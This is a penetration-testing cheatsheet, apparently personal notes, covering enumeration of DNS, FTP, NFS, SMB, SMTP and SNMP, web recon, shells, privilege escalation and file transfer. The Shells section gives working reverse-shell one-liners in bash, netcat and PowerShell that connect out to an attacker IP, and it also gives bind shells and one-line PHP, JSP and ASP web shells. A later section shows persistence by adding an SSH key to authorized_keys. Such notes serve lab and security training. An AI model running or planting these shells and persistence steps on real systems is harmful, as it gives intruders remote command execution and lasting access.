# Cheatsheet

## Table of Contents
- [Enumeration](#enumeration)
    - [Enumeration Prinicples](#enumeration-principles)
    - [Nmap](#nmap)
    - [DNS](#dns)
    - [FTP](#ftp)
    - [NFS](#nfs)
    - [SMB](#smb)
    - [SMTP](#smtp)
    - [SNMP](#snmp)
- [Web Enumeration](#web-enumeration)
    - [Banner Grabbing](#banner-grabbing)
    - [gobuster](#gobuster)
    - [whatweb](#whatweb)
- [Shells](#shells)
    - [Reverse Shells](#reverse-shells)
    - [Bind Shells](#bind-shells)
    - [Upgrading TTY](#upgrading-tty)
    - [Web Shells](#web-shells)
- [Privilege Escalation](#privilege-escalation)
    - [PrivEsc Checklists](#priveesc-checklists)
    - [Enumeration Scripts](#enumeration-scripts)
    - [Kernel Exploits](#kernel-exploits)
    - [Vunlnerable Software](#vulnerable-software)
    - [User Privileges](#user-privileges)
    - [Scheduled Tasks](#scheduled-tasks)
    - [Exposed Credentials](#exposed-credentials)
    - [SSH Keys](#ssh-keys)
- [Transferring Files](#transferring-files)
- [Other](#other)
    - [Django](#django)
    - [Network](#network)
    - [Tcpdump](#tcpdump)
    - [Tmux](#tmux)
    - [Vim](#vim)

## Enumeration

### Enumeration Principles

**The goal is not to get at the systems but to find all ways to get there**

Questions to answer when enumerating:

- What can we see?
- What reasons can we have for seeing it?
- What image does what we see create for us?
- What do we gain from it?
- How can we use it?
- What can we not see?
- What reasons can there be that we do not see?
- What image results for us from what we do not see?

**The Enumeration Principles**

1. There is more than meets the eye. Consider all points of view
2. Distinguish between what we see and what we do not see
3. There are always ways to gain more information. Understand the target

### Nmap

Scan options:

```
--disable-arp-ping // reduce false positives on host discovery, see man page
--packet-trace // view packets sent by scan
--stats-every=<xm OR xs> // stats every x mins or x secs
--script <category> // execute scripts of chosen category
--script <script-name>,<script-name>
```

**Scripts**

Update script DB:  
`sudo nmap --script-updatedb`

Find scripts for a service:  
`locate scripts/<service-name>`

| Category | Description |
|----------|-------------|
| auth | Determination of authentication credentials. |
| broadcast | Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans. |
| brute | Executes scripts that try to log in to the respective service by brute-forcing with credentials. |
| default | Default scripts executed by using the `-sC` option. |
| discovery | Evaluation of accessible services. |
| dos | These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services. |
| exploit | This category of scripts tries to exploit known vulnerabilities for the scanned port. |
| external | Scripts that use external services for further processing. |
| fuzzer | This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time. |
| intrusive | Intrusive scripts that could negatively affect the target system. |
| malware | Checks if some malware infects the target system. |
| safe | Defensive scripts that do not perform intrusive and destructive access. |
| version | Extension for service detection. |
| vuln | Identification of specific vulnerabilities. |

**OS Discovery**

Cross reference service versions with changelogs to find OS version (not necessarily correct)

### DNS

Service Interaction:

```bash
# NS query
# Find other name servers from the target DNS server
dig NS example.com @10.10.10.4

# Version query
# Query the version of the DNS server using a class CHAOS query and type TXT
dig CH TXT version.bind 10.10.10.4

# ANY query
# Use ANY to view all available records (not all entries from the zones will be shown)
dig ANY example.com @10.10.10.4

# AXFR Zone Transfer
# Initiate a zone transfer, giving us a copy of the zone from the primary server
dig AXFR example.com @10.10.10.4S

# AXFR Zone Transfer - Internal
dig AXFR internal.example.com @10.10.10.4

# Make sure to enumerate subdomains of subdomains found with AXFR Zone transfers
# i.e zone transfer and brute-forcing on sub.internal.example.com etc.

# Brute-force subdomains one liner
# Inverted grep match on SOA records, remove new lines with sed
for sub in $(cat /path/to/wordlist);do dig $sub.example.com @10.10.10.4 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

# Brute-force subdomains with DNSenum
dnsenum --dnsserver 10.10.10.4 --enum -p 0 -s 0 -o subdomains.txt -f /path/to/wordlist domain.com
```

Servers:

**bind9**

```bash
# config files
ls /etc/bind/named.conf.*
```

### FTP

Find FTP scripts:

```bash
locate scripts/ftp
find / -type f -name ftp* 2>/dev/null | grep scripts
```

Script scan (Aggressive):

```bash
nmap -sV -sC -A -p21 10.10.10.1

# With script packet trace
nmap -sV -sC -A -p21 10.10.10.1 --script-trace
```

Service interaction:

```bash
nc -nv 10.10.10.1 21

telnet 10.10.10.1 21

# Use openssl for servers running TLS/SSL (also gives us the SSL cert)
openssl s_client -connect 10.10.10.1:21 -starttls ftp
```

Download all available files (wget will create a dir with the IP address as the name)

```bash
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.2
```

Servers:

**vsFTPd**

if `hide_ids=YES` then the UID and GUID representation of the service will overwrite that of the 
user

```bash
# Get server status
ftp> status

# Debug mode
ftp> debug

# Packet trace
ftp> trace
```

### NFS

Script scan:

```bash
# Service discovery on NFS ports 111 and 2049
sudo nmap 10.10.10.2 -p111,2049 -sC -sV

# rpcinfo script to find running RPC services
sudo nmap 10.10.10.2 -p111 --script rpcinfo

# All NFS scripts (share contents and stats)
sudo nmap 10.10.10.2 -p111,2049 --script nfs* -sV
```

Service Interaction:

```bash
# Show available shares
showmount -e 10.10.10.2

# Mount a share
sudo mount -t nfs 10.10.10.2:/ ./local_dir -o nolock

# List directory with UIDs & GIDs (impersonate user on writable shares)
ls -n ./local_dir

# Create a user with the desired UID (GID can be set with -g, group must exist)
useradd -u 1000 username

# Unmount a share
sudo umount ./local_dir
```

NFS Server:

Requires nfs-kernel-server (& nfs-common?)

Restart nfs-kernel-server after creating a new share

```bash
# Show share configuration
cat /etc/exports

# Show shares
exportfs

# Create a share
# options here: https://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html
echo "/mnt/nfs 10.10.10.0/24(sync,no_tree_subcheck)" >> /etc/exports
```

### SMB

Service Interaction:

**SMBclient**

```bash
# List shares with a null session (Anonymous)
smbclient -N -L \\10.10.10.2

# Connect to share
smbclient \\10.10.10.2\share
```

```bash
# Download files
smb: \> get filename.txt

# Execute command on local machine
smb: /> !ls
```

Use `!<cmd>` to execute commands on local machine without disconnecting from SMB share

**RPCclient**

Full list of commands in [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)

```bash
# Connect
rpcclient -U "" 10.10.10.2

# Enumeration

# Server info
rpcclient $> srvinfo

# Enumerate domains in the network
rpcclient $> enumdomains

# Query Domain info
rpcclient $> querydominfo

# Enumerate network shares
rpcclient $> netshareenumall

# Share info
rpcclient $> netsharegetinfo <share>

# Enumerate Domain users
rpcclient $> enumdomusers

# User info (RID displayed next to user in enumdomuser output)
rpcclient $> queryuser <RID>

# Group info (obtained from queryuser: group_rid)
rpcclient $> querygroup <RID>
```

```bash
# Impacket's samrdump (similar to using rpcclient in a for loop to enumerate user and group RIDs)
samrdump.py 10.10.10.2

# SMBmap list shares for host, lots more features (not working with v.1.10.4)
smbmap -H 10.10.10.2

# CrackMapExec list shares
crackmapexec smb 10.10.10.2 --shares -u '' -p ''

# Enum4linux dumps a lot of info on the target, including SMB
enum4linux 10.10.10.2 -A
```

Servers:

**Samba**

Example Share (don't forget to create the share dir)

```
[test]
   comment = ATestShare
   path = /mnt/test
   browseable = yes
   read only = no
   writable = yes
   guest ok = yes
   enable privileges = yes
   create mask = 0777
   directory mask = 0777
```

```bash
# Config file
cat /etc/samba/smb.conf

# Validate smb.conf
testparms

# Restart Samba
systemctl restart smbd

# Check Samba status
smbstatus
```

### SMTP

Service interaction:

```bash
telnet 10.10.10.2 25

# smtp-user-enum enumerate users https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum
# set time to wait with -w and number of threads with -m
smtp-user-enum -U wordlist.txt -t 10.10.10.2
```

### SNMP

Default community strings of `public` and `private` are often unchanged

SNMP version 1 and 2c controls access with plaintext community strings

We can dump useful information from process parameters like credentials, routing information,
services bound to additional interfaces, and the version of installed software

```bash
# OIDs will be displayed after executing snmpwalk
# -v: version of SNMP, 1.3.6.1.2.1.1.5.0: OID for string
snmpwalk -v 2c -c public 10.10.10.1 1.3.6.1.2.1.1.5.0

# bruteforce community string names with onesixtyone
onesixtyone -c dict.txt 10.10.10.1
```

## Web Enumeration

### Banner grabbing

```bash
# netcat
nc -nv 10.10.0.1 22

# using DNS as source port (evasion)
ncat -nv --source-port 53 10.10.0.1 22

# curl
curl -IL https://10.10.10.1

# nmap script
nmap 10.10.0.1 -p22 --script banner
```

### gobuster

```bash
# directory enumeration
gobuster dir -u http://10.10.10.1/ -w /usr/share/dirb/wordlistts/common.txt

# DNS enumeration
gobuster dns -d google.com -w /usr/share/seclists/Discovery/DNS/namelist.txt
```

### whatweb

Extract the version of web servers, supporting frameworks, and applications

```bash
whatweb 10.10.10.1
```

### Certificates

View SSL/TLS certificates of HTTPS websites for information on the target organization

### Robots.txt

Navigate to /robots.txt to find potential targets

## Shells

### Reverse Shells

Bash

```bash
# tcp
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# nc pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

PowerShell

```powershell
# TCP client to IEX
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### Bind Shells

Bash

```bash
# nc pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Python

```python
# socket listener to subprocess
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")
```

PowerShell
```powershell
# socket listener to IEX
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Upgrading TTY

```bash
# python/stty method
python -c 'import pty; pty.spawn("/bin/bash")'

# background the netcat shell
^Z

# use stty to prevent input from being processed in our terminal
# Ctrl+c will not terminate the current process, arrow keys will move the cursor etc.
stty raw -echo

# foreground the netcat shell
fg

# open another terminal and determine settings for the nectcat shell
echo $TERM
stty size

# go back to the netcat shell and set the desired values
export TERM=xterm-256color
stty rows 51 columns 116
```

### Web Shells

PHP

```php
<?php system($_REQUEST["cmd"]); ?>
```

JSP (Java Server Pages)

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP

```asp
<% eval request("cmd") %>
```

Common web server webroots

| Web Server | Default Webroot |
|------------|-----------------|
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | C:\inetpub\wwwroot\ |
| XAMPP | C:|xampp\htdocs\ |

## Privilege Escalation

### PriveEsc Checklists

[HackTricks](https://book.hacktricks.xyz/)
- [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
- [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Enumeration Scripts

Linux
- [LinEnum](https://github.com/rebootuser/LinEnum.git)
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
- [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

Windows
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [JAWS](https://github.com/411Hall/JAWS)
- [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### Kernel Exploits

Check public exploits for any old OS versions we encounter

### Vulnerable Software

Check installed software for vulnerabilities

Linux

```bash
dpkg -l
```

Windows

```powershell
Get-ChildItem "C:\Program Files"
Get-ChildItem "C:\Program Files (x86)"
```

### User Privileges

Linux - [GTFOBins](https://gtfobins.github.io/)

```bash
# list sudo privileges for the user
sudo -l

# run commmands as another user
sudo -u user /path/to/bin
```

Windows - [LOLBAS](https://lolbas-project.github.io/#)

### Scheduled Tasks

Linux

- Cron Jobs

```
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root
```

Windows

- Scheduled Tasks

```cmd
schtasks
schtasks /Query /FO list
schtasks /Query /FO table > table.txt
```

### Exposed Credentials

Check config files, logs, bash_history, PSReadLine

### SSH Keys

```bash
# generate a new ssh key as a compromised user
ssh-keygen -f key

# add the key to authorised_keys
cat key.pub >> ~/.ssh/authorized_keys

# connect to the target with the new key
ssh user@10.10.10.1 -i key
```

## Transferring Files

Wget and cURL

```bash
wget http://10.10.10.1:8080/linpeas.sh
curl http://10.10.10.1:8080/linpeas.sh -o /tmp/linpeas.sh
```

SCP

```bash
scp linpeas.sh user@10.10.10.1:/tmp/linpeas.sh
```

base64

```bash
# encode file on attackers machine
base64 shell -w 0

# copy and paste base64 string to the target
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

Validate files

```bash
# validate a transferred file's format
file shell

# validate file after encoding, run on attacker machine and target then compare
md5sum shell
```

## Other

### Django

[OWASP Top 10 for Django](https://github.com/boomcamp/django-security)

### Network

Ports cheatsheets:
- https://www.stationx.net/common-ports-cheat-sheet/
- https://packetlife.net/media/library/23/common-ports.pdf
- https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/

View accessible networks (routing table):  
`netstat -rn`

Show IPv4 interfaces:  

```bash
# show all interfaces
ip -4 a

# show named interface
ip -4 a show eth0
```

### Tcpdump

Monitor tcp packets from host to IP

```bash
sudo tcpdump -i eth0 host 10.10.10.1 and 10.6.6.1
```

### Tmux

Command prefix: `Ctrl + b`  
New window: prefix, `c`  
Split vertically: prefix, `Shift + %`  
Split horizontally: prefix, `Shift + "`  
Switch: prefix, `up/down/left/right arrow`  

### Vim

| Command | Description |
|---------|-------------|
| x | Cut char |
| dw | Cut word |
| dd | Cut line |
| yw | Copy word |
| yy | Copy line |
| p | Paste |
| :1 | Go to line 1 |